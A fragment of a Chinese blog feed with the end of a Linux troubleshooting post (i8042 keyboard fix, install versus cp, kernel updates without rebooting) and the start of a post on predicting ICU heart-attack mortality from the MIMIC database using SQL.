<li>然而高兴早了，还是不行, 但是搜到了一个和我一样的<span class="exturl" data-url="aHR0cHM6Ly91bml4LnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy8zNTQ4MDIvcHMtMi1rZXlib2FyZC1vbmx5LXdvcmtzLXVwLXRvLWdydWItbm90LWFmdGVyLW9zLWZ1bGx5LWJvb3RlZD9ub3JlZGlyZWN0PTEmYW1wO2xxPTE=">PS/2 keyboard only works up to GRUB, not after OS fully booted<i class="fa fa-external-link-alt"></i></span> 没有得到解决</li>
<li>这个问题没有解决，但是有上面那个提问告诉我一个重要的信息：直到GRUB都还是工作的（works up to GRUB）。于是我在GRUB界面试了试，上下和回车都能用、NumLock也是亮的。</li>
<li>那就简单了，是GRUB启动参数哪里有问题喽。搜索“GRUB i8042”发现很多触控板的问题（touchpad），GRUB加上启动参数<code>i8042.reset i8042.nomux i8042.nopnp i8042.noloop</code>问题立刻解决了</li>
<li>还看到下面<span class="exturl" data-url="aHR0cHM6Ly91bml4LnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy8yODczNi93aGF0LWRvZXMtdGhlLWk4MDQyLW5vbXV4LTEta2VybmVsLW9wdGlvbi1kby1kdXJpbmctYm9vdGluZy1vZi11YnVudHU=">这个链接<i class="fa fa-external-link-alt"></i></span>回答为什么添加<code>i8042.nomux</code>参数能解决触控板的问题（自动检测是否多工（Multiplexing）的默认配置有问题，改成禁用就好了）。</li>
<li>去<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvRG9jdW1lbnRhdGlvbi9hZG1pbi1ndWlkZS9rZXJuZWwtcGFyYW1ldGVycy50eHQ=">内核文档<i class="fa fa-external-link-alt"></i></span>里查一下, 其他几个选项分别是 <pre class="line-numbers language-none"><code class="language-none">i8042.nopnp	[HW] Don&#39;t use ACPIPnP &#x2F; PnPBIOS to discover KBD&#x2F;AUX具体
			     controllers
        不使用ACPIPNP或可插拔BIOS模式发现KBD&#x2F;AUX（Keyboard input driver，键盘输入驱动，Auxiliary，音频）可能是这个意思，我猜的
i8042.notimeout	[HW] Ignore timeout condition signalled by controller
        忽略超时
i8042.reset	[HW] Reset the controller during init, cleanup and
			     suspend-to-ram transitions, only during s2r
			     transitions, or never reset
        就是reset重置呗
i8042.noloop	[HW] Disable the AUX Loopback command while probing
			     for the AUX port
        禁用AUX回环？音频相关的东西，应该跟这个参数没关系<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> 看起来起作用的应该是nopnp这个参数起作用了，去掉其他3个参数，试了一下就是它。</li>
<li>进一步查找根源问题和报告BUG的环节了。先去报BUG的那几个地方（Google搜出来都是launchpad怎么设置）用<code>nopnp</code>和<code>PnPBIOS</code>搜一下有没有相关的 Bug Report。在LKML邮件列表上可以找到这个：<span class="exturl" data-url="aHR0cHM6Ly9sa21sLm9yZy9sa21sLzIwMjAvMTAvMTMvNTU4">PS/2 mouse not detected with ACPIPnP/PnPBIOS<i class="fa fa-external-link-alt"></i></span> 这一串邮件已经找到了问题。 并且在2020.10.13在bugzilla已经发了<span class="exturl" data-url="aHR0cHM6Ly9idWd6aWxsYS5rZXJuZWwub3JnL3Nob3dfYnVnLmNnaT9pZD0yMDk2NTc=">PnP unable to detect connected PS/2 mouse on Asus F2A85-M PRO<i class="fa fa-external-link-alt"></i></span> 今年3月份的时候还给出了Patch，就等合并了。（更新，4月14号这个patched被defer） 行了，<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMzMjM0NzYzMi9hbnN3ZXIvNzMyMzA3MDY4">我修了Linux内核的一个小bug，应该如何把它推进主线呢？ - 醉卧沙场的回答<i class="fa fa-external-link-alt"></i></span>教的东西也用不上了，就等合并吧.....</li>
</ol>
<h2 id="日常维护">日常维护</h2>
<h3 id="备份">备份</h3>
<blockquote>
<p>备份，然后重装</p>
</blockquote>
<p>如果硬盘或者u盘够大，推荐使用rsync或timeshift（其实也是调用的rsync或btrfs snapshot） btrfs用户可以使用btrfs snapshots</p>
<p>备份硬盘不够大就只备份dotfiles等配置文件和个人资料就好了。</p>
<h3 id="谨慎进行危险操作">谨慎进行危险操作</h3>
<p>一些可能会带来的操作尽量现在虚拟机、容器里面试一下。然而，能够意识到危险的东西一般不会把你坑了。</p>
<h3 id="dotfiles和脚本">dotfiles和脚本</h3>
<p>经常换电脑或重装可以准备dotfiles和快速安装脚本</p>
<h3 id="安全问题">安全问题</h3>
<p>桌面发行版如果没有暴露在外的公网IP和端口，应该不用担心。（毕竟桌面玩家大部分连个独显都没有，挖矿都榨不出油水（而且我简单不少Linux万家有钱了都叛逃Mac了）） 不放心就用iptables/nftables设置一下防火墙，设置一下用户和文件的权限；还不放心可以用clamav等工具扫一扫rookit。 虽然x11不少安全问题，桌面版sandbox隔离做的不好，可是这都不重要，你要小心的是流氓软件而不是所谓的CVE、0day。</p>
<h2 id="不想重启怎么办">不想重启怎么办</h2>
<p>如果你用的是ArchLinux等滚动发行版，有不少更新是要重启后生效的。普通用户还是更新后重启一下比较好（这可能是最省心省力的）。 如果你不想重启，那也没问题。 <strong>可能唯一不得不重启的就是内核更新了。</strong></p>
<h3 id="安装更新发生了什么">安装更新发生了什么</h3>
<p>你可能听过这样的说法，Linux更新后的旧程序仍然跑在内存里，重启后才生效。可是内存不才一共就那么点？（啊，还有swap等交换区，那加起来也而不多）怎么装得下？ 实际上这些安装文件是（通常是）通过mmap建立虚拟地址映射，还在硬盘里。</p>
<p>在安装脚本和编译命令里面你会看到<code>install</code>这个命令，它跟<code>cp</code>命令最大的区别不是权限管理，而是更改前<code>unlink</code>。 <code>cp</code>会把指定目录原有的文件删掉然后再将新的拷贝到指定目录，而当你有二进制文件在运行的时候，用<code>cp</code>更改这个二进制文件直接删会出错（可能<code>cp</code>命令报错<code>device or resource busy</code>执行失败，或<code>cp</code>执行成功但是导致正在运行的东西出现问题）。 而<code>install</code>会先<code>unlink</code>拷贝一个副本，很像Btrfs的COW（Copy on Write）机制，如果在用，原文件暂时保留（inode），新文件用新的inode，如果有程序在使用这个文件，在mmap映射中依然可以找到原文件（的inode）。虽然这个时候看起来你在安装目录原来的文件已经没了（<code>ls</code>命令查看<code>/usr/bin/XXX</code>、<code>/usr/lib/XXX</code>已经找不到旧文件了，只能看到新安装的），但是实际上在硬盘里还有副本（inode还在）。等到旧文件没有进程在用（refer,引用）之后（inode引用计数为0），旧文件才会被真正删掉；下次再引用的时候，就是新文件了。 （可以用<code>lsof /usr/bin/ssh</code>查看哪个进程在引用或读写<code>/usr/bin/ssh</code>这个文件）</p>
<p>普通的更新，无需重启整个系统。关闭应用或<code>kill</code>相关进程再打开应该就是新的了。</p>
<p>ps：不同文件系统的<code>cp</code>行为可能不一样（比如有COW的Btrfs和ZFS, 如果你启用了<code>reflink</code>参数）。不同<code>install</code>命令的实现可能也不一样。有些不太靠谱的安装使用<code>cp</code>命令更新二进制文件（比如Archlinux的AUR里某些野包），所以我喜欢刚开机的时候更新。</p>
<p>见：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82Nzg5NDg3OA==">Linux中的mmap映射 [一]<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMDkwNjI0MTA0NDQxL2h0dHA6Ly9lbi5jaHlzLmluZm8vMjAwOS8wNS9pbnN0YWxsLXZzLWNwLWFuZC1tbWFwLw==">install vs. cp; and mmap<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ29weS1vbi13cml0ZQ==">Copy-on-write<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi91bmxpbmsuMi5odG1s">unlink(2) — Linux manual page<i class="fa fa-external-link-alt"></i></span> 里的这段话： If the name was the last link to a file but any processes still have the file open, the file will remain in existence until the last file descriptor referring to it is closed.</p>
<h3 id="不重启整个系统让更新生效">不重启整个系统让更新生效</h3>
<p>普通的用户态的程序，直接重启这个程序就完了。 涉及到systemd daemon，<code>systemctl restart XXX</code> 如果更新了<code>glibc</code>，那稍微麻烦一点, 这个东西影响比较多。至少要重启DE（Desktop Enviroment, 比如KDE）、systemd（已经你正在跑的daemon）、以及systemd依赖的dbus等等。（不推荐萌新尝试，很容易搞出问题，直接重启整个系统简单粗暴好用） 如果更新了<code>kernel module</code>，如果没生效试试手动<code>modprobe XXX</code>一下。</p>
<h3 id="内核更新不重启暂时">内核更新不重启（暂时）</h3>
<p>这个括号里的<strong>暂时</strong>的意思是说，现在并没有很好的真·更新内核后不重启的办法（特别是Archlinux等滚动发行版）。下面要说到的<code>kexec</code>、<code>livepatch</code>等热更新都是用来修安全问题打补丁的（狂刷版本号的滚动更新请老老实实挑个空闲时间重启）。<br />
如果想避免频繁更新内核之后的重启，请换用更新频率低的lts内核，比如非滚动升级的发行版（比如RH）。Arch可以用依云仙子的<code>linux-lily</code>，基本上半年更新一次（Arch的lts内核的更新频率并不低，甚至有些时候<code>linux-lts</code>比<code>linux</code>包版本号还高（前一段时间 5.10 lts 那会））。 如果你使用定制内核，部分模块（比如显卡驱动）推荐使用<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0R5bmFtaWNfS2VybmVsX01vZHVsZV9TdXBwb3J0">DKMS<i class="fa fa-external-link-alt"></i></span></p>
<p>一些给内核打热补丁的新技术，比如<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3QvbGl2ZXBhdGNoL2xpdmVwYXRjaC5odG1s">livepatch<i class="fa fa-external-link-alt"></i></span>在<span class="exturl" data-url="aHR0cHM6Ly91YnVudHUuY29tL3NlY3VyaXR5L2xpdmVwYXRjaA==">Ubuntu等发行版已经支持了<i class="fa fa-external-link-alt"></i></span>，一定程度上减小了内核更新频率。很可惜更新内核频繁的Archlinux并没有默认启用，如果想自己打patch可以参考<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0tlcm5lbF9saXZlX3BhdGNoaW5n">wiki<i class="fa fa-external-link-alt"></i></span>。很可惜Arch默认也不会像Debian/Ubuntu的apt更新之后提示你是否应该重启，不过有个叫<code>needrestart</code>的包，会帮你在更新之后检查哪个 systemd daemon 需要更新。</p>
<p>之前讲调试kernel panic的时候提过<code>kexec</code>用于切换内核, 临时应付一下到下次关机可以用这个。如果嫌<code>kexec</code>麻烦可以试试下面这个：</p>
<p>在Archlinux上如果想在更新内核后临时使用旧内核到关机，可以用<code>kernel-modules-hook</code>这个包。注意，这个包会保留你原来的kernel在<code>/usr/lib/modules/</code>里面，要在重启时自动清理旧内核需要启动 systemd daemon： <code>systemctl enable linux-modules-cleanup</code></p>
<p>reddit版块有一个<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy9kMWxqMGEvaG93X2NvbWVfYXJjaF9saW51eF9jYW5fdXBncmFkZV90aGVfa2VybmVsLw==">讨论贴<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="个人体验和想说的话">个人体验和想说的话</h2>
<h3 id="使用体验">使用体验</h3>
<p>混成器（compositer）有OpenGL2、OpenGL3.1、xrender三个选项，混成器和显卡驱动设置不当经常会出一些小问题，比如Kwin屏幕撕裂、黑屏、卡死。如果你的鼠标卡住动不了了，可以在重启plasma之前禁用混成试试（默认的快捷键是Alt+Shift+F12）</p>
<p><img src="/linux-rescue/1618028977.png" /></p>
<p>对于混成器感兴趣可以看看fc老师的这篇博客：<span class="exturl" data-url="aHR0cHM6Ly9mYXJzZWVyZmMubWUvemhzL2JyaWVmLWhpc3Rvcnktb2YtY29tcG9zaXRvcnMtaW4tZGVza3RvcC1vcy5odG1s">桌面系统的混成器简史<i class="fa fa-external-link-alt"></i></span>，不过现在2021年了，wayland还是。。。</p>
<p>如果你用Nivida，或者KDE，或者除了gdm以外的其他dm,不太推荐wayland。如果你喜欢触控板和GNOME,可以试试。 KDE用户可以考虑关闭baloo（这是一个搜索工具，然而经常出现内存占用飙升、CPU 100%）</p>
<blockquote>
<p>如果你使用 <span class="exturl" data-url="aHR0cHM6Ly9hcmNobGludXgub3JnL3BhY2thZ2VzLz9uYW1lPXF0NWN0">qt5ct<i class="fa fa-external-link-alt"></i></span> 包，Qt5 设置工具将有可能覆盖系用设置内的字体设置。</p>
</blockquote>
<p>小白用户可能还是适合Windows，如果用Linux就老老实实默认设置，不要为了好看去照着不知道哪来的教程做一些自己也不知道干了什么的美化。 如果真想入坑定制和美化，不妨去reddit的 Unix Porn 看看。 休眠设置不当经常导致很多问题，swap和zram要仔细配置 显卡驱动是万恶之源，Nvidia Fuck you！ 使用wayland基本就是灵车漂移 使用pipewire也是 btrfs曾经是灵车，现在不是生产环境个人使用感觉还行（请善用snapshots备份） 虽然只用过2个月的Manjaro，然而出问题的次数比我用了一年Arch还多。 用CentOS是不可能用CentOS的，用windows都不可能用CentOS的。</p>
<h3 id="一些闲话">一些闲话</h3>
<p>Linux用户包括Linux做主力的桌面玩家，靠这个吃饭的服务器运维或者网管，驱动和嵌入式开发们、红帽和Canonical.....当然更多的人只是偶尔连上去服务器的或者有一台不常用的桌面系统（一般是Ubuntu，还是wsl、跑在虚拟机里的那种）。最早我接触Linux的时候，是本科那会，基本都是arm的板子，调试串口写点驱动...桌面发行版就一个Ubuntu16扔在虚拟机里除了干活没打开过几次。当时还要频繁的用protel画pcb、stm32套件，用word应付乱七八糟的实验报告，根本没想到有一天会将Linux作为主力桌面系统。<br />
余生也晚，据说曾经的Linux中文论坛和社区人声鼎沸，现在都随着irc、bbs时代一起没落了；然而现在Linux等话题下面充斥着活跃的是营销号、卖书的、卖课的、忽悠考证的，还有Linux中国之类的垃圾机翻，以及无数的伸手党。 ps：最近老男孩抄袭spug运维的事又闹得沸沸扬扬的，某些卖课培训班的德行，啧啧。本来是想兼谈服务器的，毕竟在大多数人眼里这才是“正事”，“桌面”那属于不务正业浪费时间瞎折腾。让他们卖课噶韭菜用CentOS的人看抄了无数遍的N手老资料去吧。 都说到这了，<span class="exturl" data-url="aHR0cHM6Ly9jZW50b3MucmlwLw==">给CentOS上个香<i class="fa fa-external-link-alt"></i></span>再走吧。</p>
<p>相比于Linux/Unix在服务器上几年不关机稳如狗的表现，桌面环境和应用的崩溃和卡死是司空见惯的事，，毕竟用爱发电的开源拖拉机没那么多人手和资金用在测试和GUI体验上，<strong>要习惯，不要大惊小怪，也不要死机了就一言不合重启重装</strong>（或者你可以去用wm或者在termial下面用Vim等终端工具生活）</p>
<p>现在的Linux桌面和软件已经比以前完善、漂亮、稳定多了，我个人比较看好KDE，当然。 大部分情况下导致桌面卡死的就那么几个东西，比如vscode内存泄漏，比如baloo，比如pipewire和pulseaudio，比如某些Wine的软件。</p>
<h2 id="参考和推荐阅读">参考和推荐阅读</h2>
<p>https://xiaoyeshiyu.github.io/linux/fae/2017/05/11/实例使用crash分析Kdump转储kernel崩溃内核/<br />
https://thomask.sdf.org/blog/2019/11/09/take-care-editing-bash-scripts.html<br />
https://news.ycombinator.com/item?id=23087308<br />
https://juejin.cn/post/6844904122609565703<br />
https://wiki.archlinux.org/index.php/Kdump<br />
http://www.brendangregg.com/linuxperf.html<br />
https://en.wikipedia.org/wiki/Magic_SysRq_key<br />
https://wiki.archlinux.org/index.php/General_troubleshooting<br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3Qv">The Linux Kernel documentation<i class="fa fa-external-link-alt"></i></span> 网上搜不到的解决办法时候再去查文档</p>
<p>ArchLinux相关：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwLy9HZW5lcmFsX3JlY29tbWVuZGF0aW9uc18o566A5L2T5Lit5paHKQ==">ArchWiki: General recommendations (简体中文)<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0dlbmVyYWxfdHJvdWJsZXNob290aW5n">ArchWiki: General troubleshooting<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0RlYnVnXy1fR2V0dGluZ19UcmFjZXM=">ArchWiki Debug - Getting Traces<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0J1Z19yZXBvcnRpbmdfZ3VpZGVsaW5lcw==">ArchWiki Bug reporting guidelines<i class="fa fa-external-link-alt"></i></span></p>
<p>安全相关：</p>
<p>https://madaidans-insecurities.github.io/guides/linux-hardening.html#choosing-the-right-distro https://wiki.archlinux.org/title/Security_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) https://github.com/imthenachoman/How-To-Secure-A-Linux-Server#disable-root-login</p>
<h3 id="喜欢折腾且有时间可以看看这些">喜欢折腾且有时间可以看看这些</h3>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5saW51eGZyb21zY3JhdGNoLm9yZy9sZnMvdmlldy9zdGFibGUv">Linux From Scratch<i class="fa fa-external-link-alt"></i></span> 著名的LFS，教你从头编译，照着教程来不难，需要一点耐心和性能足够好的机器用来编译。这有个<span class="exturl" data-url="aHR0cHM6Ly9sY3R0LmdpdGh1Yi5pby9MRlMtQk9PSy9sZnMtc3lzdi9MRlMtQk9PSy5odG1s">中文翻译<i class="fa fa-external-link-alt"></i></span>可以参考。<br />
<span class="exturl" data-url="aHR0cHM6Ly9ib290bGluLmNvbS9kb2MvbGVnYWN5L2VsZnMvZW1iZWRkZWRfbGZzLnBkZg==">Embedded Linux From Scratch<i class="fa fa-external-link-alt"></i></span> bootlin的嵌入式Linux教程，略老<br />
<span class="exturl" data-url="aHR0cHM6Ly9yaXNjdi5vcmcvbmV3cy8yMDIwLzEyL2VtYmVkZGVkLWxpbnV4LWZyb20tc2NyYXRjaC1pbi00NS1taW51dGVzLW9uLXJpc2Mtdi1ib290bGluLw==">Embedded Linux “from scratch” in 45 minutes…on RISC-V | Bootlin<i class="fa fa-external-link-alt"></i></span> 貌似现在流行risc-v和Rust写嵌入式的东西，老了，没玩过。<br />
<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZQ==">Elixir Cross Referencer<i class="fa fa-external-link-alt"></i></span> 还是bootlin的，能在线查看Linux源码<br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY29kZWR1bXAuaW5mby9wb3N0LzIwMjAwMTI4LXN5c3RlbXRhcC1ieS1leGFtcGxlLw==">通过实例快速入门Systemtap<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpY2h1YW5nL2F3ZXNvbWUtc3lzdGVtdGFwLWNu">awesome-systemtap-cn<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLm9wZW5yZXN0eS5jb20uY24vY24vZHluYW1pYy10cmFjaW5nLw==">动态追踪技术漫谈<i class="fa fa-external-link-alt"></i></span> 强烈推荐<br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnBhY2thZ2VjbG91ZC5pby9lbmcvMjAxNi8wNi8yMi9tb25pdG9yaW5nLXR1bmluZy1saW51eC1uZXR3b3JraW5nLXN0YWNrLXJlY2VpdmluZy1kYXRhLyM=">Monitoring and Tuning the Linux Networking Stack: Receiving Data<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnBhY2thZ2VjbG91ZC5pby9lbmcvMjAxNy8wMi8wNi9tb25pdG9yaW5nLXR1bmluZy1saW51eC1uZXR3b3JraW5nLXN0YWNrLXNlbmRpbmctZGF0YS8=">Monitoring and Tuning the Linux Networking Stack: Sending Data<i class="fa fa-external-link-alt"></i></span> 这两篇是讲网络栈监控和调优的，经典文章。流传很广，也有很多中文翻译，不过原文直白简练，推荐直接看原文</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>rescue</tag>
      </tags>
  </entry>
  <entry>
    <title>基于机器学习的ICU急性心肌梗死死亡率预测（MIMIC数据库）</title>
    <url>/morality-prediction/</url>
    <content><![CDATA[<p>更新：推荐使用新版的MIMIC数据库自行构建数据集，并尝试整合eICU的病人数据。据说LSTM等方法效果不错，可以试试。 处理过程已经放在github上了：https://github.com/Archaeoraptor/AMI_morality_prediction.git <span id="more"></span></p>
<p>急性心肌梗死的发病率和死亡率都很高，MIMIC里面大概有5000次记录，用来构造数据集效果会比较好，这次就用MIMIC数据库里面的急性心肌梗死进行死亡风险的预测。</p>
<p>早期心血管疾病采用TIMI（the Thrombolysis in Myocardial Infarction）风险评分、全球急性心脏事件注册表（GRACE）评分或医生经验判断。后来MIMIC、eICU等开放医学数据库的建立和公布，数据量足够支撑起机器学习，疾病风险预测逐渐开始采用机器学习等方法。 数据清洗和构造数据集</p>
<p>目前开源的ICU重症数据库主要有MIMIC和eICU；eICU里面的患者数量多一点，但是貌似数据缺失很多，数据质量也不太好（eICU整合了几家不同医院的临床记录拼凑出来的数据库，数据质量参差不齐）</p>
<p>这里我用的MIMIC-Ⅲ数据库，内有近四万名成年人以及七千多名新生儿的五万余次住院资料，其中急性心肌梗死入院记录大概5000多次。</p>
<h2 id="更新">更新</h2>
<p>前一阵MIT发布了 MIMIC IV 数据库（第四版），MIMIC-IV目前是0.4版本，以后要放出1.0正式版。希望大家下载最新版本进行训练<del>炼丹</del></p>
<p>0.4版的压缩包有6.7G,要获取需要在网站注册帐号并进行考试答题，然后同意他们关于医学伦理的条款 下载地址： <span class="exturl" data-url="aHR0cHM6Ly9waHlzaW9uZXQub3JnL2NvbnRlbnQvbWltaWNpdi8wLjQv">https://physionet.org/content/mimiciv/0.4/<i class="fa fa-external-link-alt"></i></span> 并没有BT种子之类下载方式，下载需要帐号验证，由于版权和隐私等原因，应该也不能进行二次分发 所以大家自己去下吧。</p>
<p>通过考试答题后就直接点下载链接就好了。 官网还提供了wget的下载方式，安装包有点大，我们打开bbr下载会快一点（有美国代理记得挂）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> sysctl net.ipv4.tcp_congestion_control<span class="token operator">=</span>bbr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后填你的用户名和密码就好了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -r -N -c -np --user username --ask-password https://physionet.org/files/mimiciv/0.4/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>下载好建库的时候记得建索引，不然后续操作会很慢</p>
<h2 id="患者筛选">患者筛选</h2>
<p>在MIMIC数据库中提取ICD-9疾病编号为410大类、疾病名称为 acute myocardial infarction的相关病人全部住院记录。数据表DIAGNOSE_ICD中的ICD9_CODE字段记录了患者的ICD-9编码，其中410大类编码根据发病部位被分为10个小类，例如第1个小类代表发病部位为前外侧壁、第2个小类代表发病部位为下外侧壁；这10 个小类又根据发病时期分为3个小类，0代表未细分，1代表初次入院，2代表再入院；例如，MIMIC数据库中ICD9_CODE字段为41031，对应的ICD-9编码为410.3.1，其中410代表急性心肌梗死，3代表下后壁，1代表初次入院。 <img src="%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96%E6%B5%81%E7%A8%8B.svg" alt="数据提取示意图" /></p>
<p>提取到的除后续照顾类别以外的410大类患者数据中，共有5087次入院记录，去除同一患者重复的入院记录，共有4788名病人患有急性心肌梗死（包括同时患有急性心肌梗死的并发症），其中有727人死亡，总死亡率15.18%。男性患者共2924名，平均年龄为67.2岁，死亡391人，男性死亡率13.37%；女性患者共1864名，平均年龄为73.4岁，死亡337人,女性死亡率18.10%。统计急性心肌梗死患者人群种族信息，可以发现亚裔只有74次入院记录。 特征选取</p>
<p>MIIMC里面能用的特征大概有性别年龄这些个人信息、心率血压这些生理指标、还有些用药记录之类的，为了预测患者初次发病的死亡率，只采用患者初次入院24小时内的记录检查项目作为预测指标</p>
<p>先把24小时ICUSTAY_ID选出来</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> k_AMI2 <span class="token keyword">AS</span>
<span class="token keyword">SELECT</span>
	ADMISSIONS<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>
	ADMISSIONS<span class="token punctuation">.</span>HADM_ID<span class="token punctuation">,</span>
	ADMISSIONS<span class="token punctuation">.</span>ADMITTIME<span class="token punctuation">,</span>
	ADMISSIONS<span class="token punctuation">.</span>DEATHTIME
<span class="token keyword">FROM</span>
	ADMISSIONS<span class="token punctuation">,</span>
	<span class="token punctuation">(</span>
		<span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span>
			A<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>
			<span class="token function">MAX</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>ADMITTIME<span class="token punctuation">)</span> ADMITTIME
		<span class="token keyword">FROM</span>
			ADMISSIONS A<span class="token punctuation">,</span>
			DIAGNOSES_ICD B
		<span class="token keyword">WHERE</span>
			A<span class="token punctuation">.</span>HADM_ID <span class="token operator">=</span> B<span class="token punctuation">.</span>HADM_ID
		<span class="token operator">AND</span> <span class="token punctuation">(</span>
			ICD9_CODE <span class="token operator">=</span> <span class="token string">"41000"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41001"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41010"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41011"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41020"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41021"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41030"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41031"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41040"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41041"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41050"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41051"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41060"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41061"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41070"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41081"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41090"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41091"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41002"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41012"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41022"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41032"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41042"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41052"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41062"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41072"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41082"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41092"</span>
		<span class="token punctuation">)</span>
		<span class="token keyword">GROUP</span> <span class="token keyword">BY</span>
			A<span class="token punctuation">.</span>SUBJECT_ID
	<span class="token punctuation">)</span> <span class="token keyword">AS</span> T
<span class="token keyword">WHERE</span>
	ADMISSIONS<span class="token punctuation">.</span>ADMITTIME <span class="token operator">=</span> T<span class="token punctuation">.</span>ADMITTIME
<span class="token operator">AND</span> ADMISSIONS<span class="token punctuation">.</span>SUBJECT_ID <span class="token operator">=</span> T<span class="token punctuation">.</span>SUBJECT_ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
